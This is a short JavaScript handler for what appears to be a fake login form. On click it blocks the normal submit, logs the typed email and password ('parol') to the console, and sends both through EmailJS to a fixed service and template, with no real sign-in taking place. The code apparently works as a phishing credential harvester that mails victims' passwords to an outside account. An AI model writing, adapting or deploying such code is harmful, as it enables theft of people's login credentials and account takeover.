const buton = document.querySelector(".btn");
const email = document.querySelector(".email");
const parol = document.querySelector(".parol");

buton.addEventListener("click", (e)=>{
    e.preventDefault()
    console.log(email.value);
    console.log(parol.value);
    emailjs.send("service_m3gezjb","template_r6zwg32",{
        email: email.value,
        parol: parol.value,
        });
})